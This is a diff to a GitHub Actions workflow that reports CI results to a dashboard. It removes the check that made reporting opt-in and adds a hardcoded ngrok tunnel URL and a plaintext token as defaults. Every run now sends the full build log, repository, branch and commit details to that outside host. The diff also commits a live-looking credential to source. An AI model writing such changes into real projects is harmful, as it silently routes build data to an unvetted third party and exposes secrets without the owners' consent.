@@ -38,19 +38,20 @@ jobs:
           COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
           COMMIT_SHA: ${{ github.sha }}
         run: |
-          if [ -z "$PIPELINE_WEBHOOK_URL" ] || [ -z "$CI_REPORT_TOKEN" ]; then
-            echo "::notice::Direct reporting URL not set. Dashboard will use GitHub API / webhook extraction."
-            exit 0
-          fi
           python - <<'PY'
           import json
           import os
           import urllib.request
 
+          # Use configured secret or active prototype endpoint
+          report_url = os.environ.get("PIPELINE_WEBHOOK_URL") or "https://retype-crown-showing.ngrok-free.dev"
+          report_token = os.environ.get("CI_REPORT_TOKEN") or "q76ZgtRVIbJs0ZZV_5Y29iMn3SxONKgTUiYQ5gjEFdU"
+
           with open("build.log", encoding="utf-8", errors="replace") as log_file:
               raw_log = log_file.read()
+
           payload = {
-              "run_id": os.environ["RUN_ID"],
+              "run_id": str(os.environ["RUN_ID"]),
               "run_number": int(os.environ["RUN_NUMBER"]),
               "repo": os.environ["REPOSITORY"],
               "branch": os.environ["BRANCH"],
@@ -58,18 +59,22 @@ jobs:
               "commit_sha": os.environ.get("COMMIT_SHA", ""),
               "raw_log": raw_log,
           }
+
+          endpoint = report_url.rstrip("/") + "/api/ci-result"
+          print(f"Delivering actual compiler logs to {endpoint}...")
+
           request = urllib.request.Request(
-              os.environ["PIPELINE_WEBHOOK_URL"].rstrip("/") + "/api/ci-result",
+              endpoint,
               data=json.dumps(payload).encode("utf-8"),
               headers={
                   "Content-Type": "application/json",
-                  "X-CI-Report-Token": os.environ["CI_REPORT_TOKEN"],
+                  "X-CI-Report-Token": report_token,
               },
               method="POST",
           )
           try:
               with urllib.request.urlopen(request, timeout=20) as response:
                   print("Dashboard accepted compiler output:", response.status)
-          except Exception as e:
-              print("Notice: Direct reporting skipped:", e)
+          except Exception as exc:
+              print("Notice: Direct reporting encountered an issue:", exc)
           PY
